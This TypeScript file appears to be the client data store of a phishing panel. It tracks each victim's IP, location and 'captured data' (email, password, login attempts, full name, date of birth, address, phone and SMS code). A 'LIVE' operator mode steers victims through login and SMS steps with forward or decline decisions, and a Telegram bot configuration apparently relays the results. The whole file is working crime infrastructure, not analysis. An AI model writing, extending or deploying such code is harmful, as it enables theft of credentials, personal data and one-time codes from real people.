export type ClientStatus = 'PENDING' | 'ACCEPTED' | 'BLOCKED' | 'CONNECTED';
export type SystemMode = 'AFK' | 'LIVE';
export type ProcessingStatus = 'TODO' | 'DONE';
export type AdminDecision = 'PENDING' | 'FORWARD' | 'DECLINE';
export type WaitingStep = 'NONE' | 'LOGIN' | 'SMS';

export interface LoginAttempt {
  email: string;
  pass: string;
  timestamp: number;
}

export interface ClientData {
  id: string;
  status: ClientStatus;
  ip: string;
  city: string;
  country: string;
  lastSeen: string;
  timestamp: number;
  notes?: string;
  processingStatus: ProcessingStatus;
  
  // LIVE & Control
  waitingFor: WaitingStep;
  adminDecision: AdminDecision;
  currentPage: string;
  targetPage?: string;
  executionMode?: SystemMode;

  // Captured Data
  loginAttempts: LoginAttempt[];
  email?: string;
  password?: string;
  fullName?: string;
  dob?: string;
  street?: string;
  houseNumber?: string;
  zip?: string;
  cityForm?: string;
  phone?: string;
  salutation?: string;
  smsCode?: string;
}

export interface TelegramConfig {
  botToken: string;
  chatId: string;
  active: boolean;
}

const API_ROOT = ''; // Relative to current host
const MODE_KEY = '917_panels_mode';

let cachedClients: ClientData[] = [];

export const ClientStore = {
  getSystemMode: (): SystemMode => {
    return (localStorage.getItem(MODE_KEY) as SystemMode) || 'AFK';
  },

  setSystemMode: (mode: SystemMode) => {
    localStorage.setItem(MODE_KEY, mode);
  },

  fetchClients: async (): Promise<ClientData[]> => {
    try {
      const res = await fetch(`${API_ROOT}/api/clients`);
      cachedClients = await res.json();
      return cachedClients;
    } catch (e) {
      console.error('Fetch error:', e);
      return cachedClients;
    }
  },

  getClients: (): ClientData[] => cachedClients,

  addOrUpdateClient: async (data: Partial<ClientData>) => {
    try {
      const id = data.id || sessionStorage.getItem('clientId') || 'current-session';
      await fetch(`${API_ROOT}/api/clients`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, id })
      });
      await ClientStore.fetchClients();
    } catch (e) {
      console.error('Update error:', e);
    }
  },

  deleteClient: async (id: string) => {
    try {
      await fetch(`${API_ROOT}/api/clients/${id}`, { method: 'DELETE' });
      await ClientStore.fetchClients();
    } catch (e) {
      console.error('Delete error:', e);
    }
  },

  resetAllClients: async () => {
    try {
      await fetch(`${API_ROOT}/api/clients/reset`, { method: 'POST' });
      await ClientStore.fetchClients();
      window.dispatchEvent(new Event('storage'));
    } catch (e) {
      console.error('Reset error:', e);
    }
  },

  getStats: () => {
    return {
      total: cachedClients.length,
      connected: cachedClients.filter(c => c.status === 'CONNECTED').length,
      blocked: cachedClients.filter(c => c.status === 'BLOCKED').length
    };
  },

  // Telegram Settings
  getTelegramConfig: async (): Promise<TelegramConfig> => {
    const res = await fetch(`${API_ROOT}/api/telegram`);
    return await res.json();
  },

  saveTelegramConfig: async (config: TelegramConfig) => {
    await fetch(`${API_ROOT}/api/telegram`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(config)
    });
  }
};
